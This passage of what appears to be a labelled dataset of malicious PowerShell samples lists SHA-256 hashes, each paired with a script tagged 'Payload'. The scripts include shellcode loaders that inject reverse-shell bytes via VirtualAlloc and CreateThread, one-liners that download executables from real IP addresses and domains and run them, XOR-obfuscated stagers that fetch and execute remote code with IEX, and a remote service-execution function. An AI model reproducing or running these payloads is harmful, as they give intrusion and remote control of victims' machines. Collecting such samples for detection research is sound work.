x2b,0xf7,0xd7,0xf4,0x45,0xcb;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$olqM=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($olqM.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$olqM,0,0,0);for (;;){Start-sleep 60};

",Payload
ba854bbeea607a04c07a4d0e900692c495771cdb8f299bade0728fa592b637a3,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = ;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
944942118695412c4e50754ff2617cf33a3c6f58e8805b39eace2dc4265a350c,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x38,0x82,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
039832b2b7acb64ccd9385e8e2fd7a1763d2bf0ec107d61d80c48f9241b4cb6f,"
$wC=NeW-OBJEct SYStEM.NET.WEBClieNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeadeRs.Add('User-Agent',$u);$wC.PrOxy = [SySTem.NET.WeBReQuest]::DeFAULtWEbProXy;$wc.ProxY.CREdENTiALS = [SYstEM.NeT.CRedentIalCAChe]::DEFauLtNEtworkCredeNtialS;$K='VNMkZc{S;gAe_fD8u:4xLX-Ciw^U,Br<';$i=0;[chAr[]]$b=([ChaR[]]($WC.DoWnloaDSTrING(""http://52.196.119.113:80/index.asp"")))|%{$_-BXor$k[$I++%$K.LENGtH]};IEX ($B-join'')

",Payload
3628ffd7741c04f0cc567b1d19261702fe3a4c144628c362c9972407bee967a2,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbf,0x05,0x60,0x19,0xbd,0xd9,0xed,0xd9,0x74,0x24,0xf4,0x5b,0x29,0xc9,0xb1,0x47,0x83,0xc3,0x04,0x31,0x7b,0x0f,0x03,0x7b,0x0a,0x82,0xec,0x41,0xfc,0xc0,0x0f,0xba,0xfc,0xa4,0x86,0x5f,0xcd,0xe4,0xfd,0x14,0x7d,0xd5,0x76,0x78,0x71,0x9e,0xdb,0x69,0x02,0xd2,0xf3,0x9e,0xa3,0x59,0x22,0x90,0x34,0xf1,0x16,0xb3,0xb6,0x08,0x4b,0x13,0x87,0xc2,0x9e,0x52,0xc0,0x3f,0x52,0x06,0x99,0x34,0xc1,0xb7,0xae,0x01,0xda,0x3c,0xfc,0x84,0x5a,0xa0,0xb4,0xa7,0x4b,0x77,0xcf,0xf1,0x4b,0x79,0x1c,0x8a,0xc5,0x61,0x41,0xb7,0x9c,0x1a,0xb1,0x43,0x1f,0xcb,0x88,0xac,0x8c,0x32,0x25,0x5f,0xcc,0x73,0x81,0x80,0xbb,0x8d,0xf2,0x3d,0xbc,0x49,0x89,0x99,0x49,0x4a,0x29,0x69,0xe9,0xb6,0xc8,0xbe,0x6c,0x3c,0xc6,0x0b,0xfa,0x1a,0xca,0x8a,0x2f,0x11,0xf6,0x07,0xce,0xf6,0x7f,0x53,0xf5,0xd2,0x24,0x07,0x94,0x43,0x80,0xe6,0xa9,0x94,0x6b,0x56,0x0c,0xde,0x81,0x83,0x3d,0xbd,0xcd,0x60,0x0c,0x3e,0x0d,0xef,0x07,0x4d,0x3f,0xb0,0xb3,0xd9,0x73,0x39,0x1a,0x1d,0x74,0x10,0xda,0xb1,0x8b,0x9b,0x1b,0x9b,0x4f,0xcf,0x4b,0xb3,0x66,0x70,0x00,0x43,0x87,0xa5,0xbd,0x46,0x1f,0x2b,0x02,0x40,0xd4,0xdb,0x80,0x52,0xfb,0x47,0x0c,0xb4,0xab,0x27,0x5e,0x69,0x0b,0x98,0x1e,0xd9,0xe3,0xf2,0x90,0x06,0x13,0xfd,0x7a,0x2f,0xb9,0x12,0xd3,0x07,0x55,0x8a,0x7e,0xd3,0xc4,0x53,0x55,0x99,0xc6,0xd8,0x5a,0x5d,0x88,0x28,0x16,0x4d,0x7c,0xd9,0x6d,0x2f,0x2a,0xe6,0x5b,0x5a,0xd2,0x72,0x60,0xcd,0x85,0xea,0x6a,0x28,0xe1,0xb4,0x95,0x1f,0x7a,0x7c,0x00,0xe0,0x14,0x81,0xc4,0xe0,0xe4,0xd7,0x8e,0xe0,0x8c,0x8f,0xea,0xb2,0xa9,0xcf,0x26,0xa7,0x62,0x5a,0xc9,0x9e,0xd7,0xcd,0xa1,0x1c,0x0e,0x39,0x6e,0xde,0x65,0xbb,0x52,0x09,0x43,0xc9,0xba,0x89;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
c288d38566f3267c4c25ae519aa0e8ee9e1236ce9607580d23d0e1d517d9359c,"function Invoke-PsExec {

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True)] 
        [String]
        $ComputerName,

        [String]
        $Command,

        [String]
        $ServiceName = ""TestSVC"",

        [String]
        $ResultFile,

        [String]
        $ServiceEXE,

        [switch]
        $NoCleanup
    )

    $ErrorActionPreference = ""Stop""

    
    function Local:Get-RandomString 
    {
        param (
            [int]$Length = 12
        )
        $set = ""abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"".ToCharArray()
        $result = """"
        for ($x = 0; $x -lt $Length; $x++) {
            $result += $set | Get-Random
        }
        $result
    }

    
    function Local:Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),
            
            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
        Write-Output $TypeBuilder.CreateType()
    }

    
    function Local:Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]
        
            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,
            
            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )

        
        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
        
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
        
        
        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    }


    function Local:Invoke-PsExecCmd
    {
        param(
            [Parameter(Mandatory = $True)] 
            [String]
            $ComputerName,

            [Parameter(Mandatory = $True)]
            [String]
            $Command,

            [String]
            $ServiceName = ""TestSVC"",

            [switch]
            $NoCleanup
        )

        
        
        $CloseServiceHandleAddr = Get-ProcAddress Advapi32.dll CloseServiceHandle
        $CloseServiceHandleDelegate = Get-DelegateType @( [IntPtr] ) ([Int])
        $CloseServiceHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseServiceHandleAddr, $CloseServiceHandleDelegate)    

        $OpenSCManagerAAddr = Get-ProcAddress Advapi32.dll OpenSCManagerA
        $OpenSCManagerADelegate = Get-DelegateType @( [String], [String], [Int]) ([IntPtr])
        $OpenSCManagerA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenSCManagerAAddr, $OpenSCManagerADelegate)
        
        $OpenServiceAAddr = Get-ProcAddress Advapi32.dll OpenServiceA
        $OpenServiceADelegate = Get-DelegateType @( [IntPtr], [String], [Int]) ([IntPtr])
        $OpenServiceA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenServiceAAddr, $OpenServiceADelegate)
      
        $CreateServiceAAddr = Get-ProcAddress Advapi32.dll CreateServiceA
        $CreateServiceADelegate = Get-DelegateType @( [IntPtr], [String], [String], [Int], [Int], [Int], [Int], [String], [String], [Int], [Int], [Int], [Int]) ([IntPtr])
        $CreateServiceA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateServiceAAddr, $CreateServiceADelegate)

        $StartServiceAAddr = Get-ProcAddress Advapi32.dll StartServiceA
        $StartServiceADelegate = Get-DelegateType @( [IntPtr], [Int], [Int]) ([IntPtr])
        $StartServiceA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StartServiceAAddr, $StartServiceADelegate)

        $DeleteServiceAddr = Get-ProcAddress Advapi32.dll DeleteService
        $DeleteServiceDelegate = Get-DelegateType @( [IntPtr] ) ([IntPtr])
        $DeleteService = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DeleteServiceAddr, $DeleteServiceDelegate)

        $GetLastErrorAddr = Get-ProcAddress Kernel32.dll GetLastError
        $GetLastErrorDelegate = Get-DelegateType @() ([Int])
        $GetLastError = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetLastErrorAddr, $GetLastErrorDelegate)

        
        
        
        
        $ManagerHandle = $OpenSCManagerA.Invoke(""\\$ComputerName"", ""ServicesActive"", 0xF003F)
        

        
        if ($ManagerHandle -and ($ManagerHandle -ne 0)){

            
            
            
            
            
            
            $ServiceHandle = $CreateServiceA.Invoke($ManagerHandle, $ServiceName, $ServiceName, 0xF003F, 0x10, 0x3, 0x1, $Command, $null, $null, $null, $null, $null)
            

            if ($ServiceHandle -and ($ServiceHandle -ne 0)){

                

                
                
                $t = $CloseServiceHandle.Invoke($ServiceHandle)

                
                
                $ServiceHandle = $OpenServiceA.Invoke($ManagerHandle, $ServiceName, 0xF003F)
                

                if ($ServiceHandle -and ($ServiceHandle -ne 0)){

                    
                    
                    $val = $StartServiceA.Invoke($ServiceHandle, $null, $null)

                    
                    if ($val -ne 0){
                        
                        
                        Start-Sleep -s 1
                    }
                    else{
                        
                        $err = $GetLastError.Invoke()
                        if ($err -eq 1053){
                            
                        }
                        else{
                            
                            ""[!] StartService failed, LastError: $err""
                        }
                        
                        Start-Sleep -s 1
                    }

                    if (-not $NoCleanup) {
                        
                        
                        
                        $val = $DeleteService.invoke($ServiceHandle)
                        
                        if ($val -eq 0){
                            
                            $err = $GetLastError.Invoke()
                            
                        }
                        else{
                            
                        }
                    }
                    
                    
                    
                    $val = $CloseServiceHandle.Invoke($ServiceHandle)
                    

                }
                else{
                    
                    $err = $GetLastError.Invoke()
                    
                    ""[!] OpenServiceA failed, LastError: $err""
                }
            }

            else{
                
                $err = $GetLastError.Invoke()
                
                ""[!] CreateService failed, LastError: $err""
            }

            
            
            $t = $CloseServiceHandle.Invoke($ManagerHandle)
        }
        else{
            
            $err = $GetLastError.Invoke()
            
            ""[!] OpenSCManager failed, LastError: $err""
        }
    }

    if ($Command -and ($Command -ne """")) { 

        if ($ResultFile -and ($ResultFile -ne """")) {
            

            
            $TempText = $(Get-RandomString) + "".txt""
            $TempBat = $(Get-RandomString) + "".bat""

            
            $cmd = ""%COMSPEC% /C echo $Command ^> %systemroot%\Temp\$TempText > %systemroot%\Temp\$TempBat & %COMSPEC% /C start %COMSPEC% /C %systemroot%\Temp\$TempBat""

            

            try {
                
                ""[*] Executing command and retrieving results: '$Command'""
                Invoke-PsExecCmd -ComputerName $ComputerName -Command $cmd -ServiceName $ServiceName

                
                $RemoteResultFile = ""\\$ComputerName\Admin$\Temp\$TempText""
                ""[*] Copying result file $RemoteResultFile to '$ResultFile'""
                Copy-Item -Force -Path $RemoteResultFile -Destination $ResultFile
                
                
                
                Remove-Item -Force $RemoteResultFile

                
                Remove-Item -Force ""\\$ComputerName\Admin$\Temp\$TempBat""
            }
            catch {
                
                ""Error: $_""
            }
        }

        else {
            
            
            Invoke-PsExecCmd -ComputerName $ComputerName -Command $Command -ServiceName $ServiceName
        }

    }

    elseif ($ServiceEXE -and ($ServiceEXE -ne """")) {
        

        
        $RemoteUploadPath = ""\\$ComputerName\Admin$\$ServiceEXE""
        ""[*] Copying service binary $ServiceEXE to '$RemoteUploadPath'""
        Copy-Item -Force -Path $ServiceEXE -Destination $RemoteUploadPath

        if(-not $NoCleanup) {
            
            ""[*] Executing service .EXE '$RemoteUploadPath' as service '$ServiceName' and cleaning up.""
            Invoke-PsExecCmd -ComputerName $ComputerName -Command $RemoteUploadPath -ServiceName $ServiceName

            
            ""[*] Removing the remote service .EXE '$RemoteUploadPath'""
            Remove-Item -Path $RemoteUploadPath -Force
        }
        else {
            
           ""[*] Executing service .EXE '$RemoteUploadPath' as service '$ServiceName' and not cleaning up.""
            Invoke-PsExecCmd -ComputerName $ComputerName -Command $RemoteUploadPath -ServiceName $ServiceName -NoCleanup
        }
    }

    else {
        
        
    }
}
",Payload
c0c9d579ceffc7eb9bc8d92af0a4a1dc9dd75c4e91228b36d31898a8182f09f1,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xc2,0x81,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
ac3ea8623076a8f93b1937e80565162aa6a251be6f616f193e315e2186f711b6,"
$WC=NEw-ObjeCT SySTem.NET.WEbCLIent;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$wc.HEADerS.ADd('User-Agent',$u);$wC.ProxY = [SyStEm.Net.WEbReQUest]::DeFaultWEbPrOXY;$WC.PRoXy.CreDEnTiALS = [SYSTem.NET.CReDEnTialCacHE]::DeFAuLtNeTwORKCreDEntIaLS;$K='}MrQ?3~BoP,|G<E0NUfsFLnlO^)%4d!D';$i=0;[Char[]]$B=([char[]]($wc.DownloADString(""https://46.101.185.146:8080/index.asp"")))|%{$_-BXOr$k[$i++%$k.LeNgth]};IEX ($b-JOIn'')

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
c528a1f560026cdce272cfe1931aa7cb6ea99f55f3597c758d815fd71c600e8d,"
(New-Object System.Net.WebClient).DownloadFile('http://boisedelariviere.com/backup/css/newconfig.exe',""$env:TEMP\neone6.exe"");Start-Process (""$env:TEMP\neone6.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
999bf0f25736859570bdfa1916b726786223e1d19c8296ea67950cdf4ede2959,"
($dpl=$env:temp+'f.exe');(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/bvudaf.exe', $dpl);Start-Process $dpl

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
2ab63dfd8ac55d33b1badf96d9143637af7cc7c2b35538708c2d947d77c4f687,"
(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/nigga.exe','fleeble.exe');Start-Process 'fleeble.exe'

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
3505fdf5ea79f4619d31c6e07bcbfc75ff579a95a47ef4b67fda02b05dda6f24,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0xb6,0xc8,0x5e,0x5f,0xd9,0xed,0xd9,0x74,0x24,0xf4,0x58,0x29,0xc9,0xb1,0x47,0x83,0xc0,0x04,0x31,0x50,0x0f,0x03,0x50,0xb9,0x2a,0xab,0xa3,0x2d,0x28,0x54,0x5c,0xad,0x4d,0xdc,0xb9,0x9c,0x4d,0xba,0xca,0x8e,0x7d,0xc8,0x9f,0x22,0xf5,0x9c,0x0b,0xb1,0x7b,0x09,0x3b,0x72,0x31,0x6f,0x72,0x83,0x6a,0x53,0x15,0x07,0x71,0x80,0xf5,0x36,0xba,0xd5,0xf4,0x7f,0xa7,0x14,0xa4,0x28,0xa3,0x8b,0x59,0x5d,0xf9,0x17,0xd1,0x2d,0xef,0x1f,0x06,0xe5,0x0e,0x31,0x99,0x7e,0x49,0x91,0x1b,0x53,0xe1,0x98,0x03,0xb0,0xcc,0x53,0xbf,0x02,0xba,0x65,0x69,0x5b,0x43,0xc9,0x54,0x54,0xb6,0x13,0x90,0x52,0x29,0x66,0xe8,0xa1,0xd4,0x71,0x2f,0xd8,0x02,0xf7,0xb4,0x7a,0xc0,0xaf,0x10,0x7b,0x05,0x29,0xd2,0x77,0xe2,0x3d,0xbc,0x9b,0xf5,0x92,0xb6,0xa7,0x7e,0x15,0x19,0x2e,0xc4,0x32,0xbd,0x6b,0x9e,0x5b,0xe4,0xd1,0x71,0x63,0xf6,0xba,0x2e,0xc1,0x7c,0x56,0x3a,0x78,0xdf,0x3e,0x8f,0xb1,0xe0,0xbe,0x87,0xc2,0x93,0x8c,0x08,0x79,0x3c,0xbc,0xc1,0xa7,0xbb,0xc3,0xfb,0x10,0x53,0x3a,0x04,0x61,0x7d,0xf8,0x50,0x31,0x15,0x29,0xd9,0xda,0xe5,0xd6,0x0c,0x76,0xe3,0x40,0x6f,0x2f,0xea,0x94,0x07,0x32,0xed,0xa4,0xee,0xbb,0x0b,0x94,0x40,0xec,0x83,0x54,0x31,0x4c,0x74,0x3c,0x5b,0x43,0xab,0x5c,0x64,0x89,0xc4,0xf6,0x8b,0x64,0xbc,0x6e,0x35,0x2d,0x36,0x0f,0xba,0xfb,0x32,0x0f,0x30,0x08,0xc2,0xc1,0xb1,0x65,0xd0,0xb5,0x31,0x30,0x8a,0x13,0x4d,0xee,0xa1,0x9b,0xdb,0x15,0x60,0xcc,0x73,0x14,0x55,0x3a,0xdc,0xe7,0xb0,0x31,0xd5,0x7d,0x7b,0x2d,0x1a,0x92,0x7b,0xad,0x4c,0xf8,0x7b,0xc5,0x28,0x58,0x28,0xf0,0x36,0x75,0x5c,0xa9,0xa2,0x76,0x35,0x1e,0x64,0x1f,0xbb,0x79,0x42,0x80,0x44,0xac,0x52,0xfc,0x92,0x88,0x20,0xec,0x26;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) 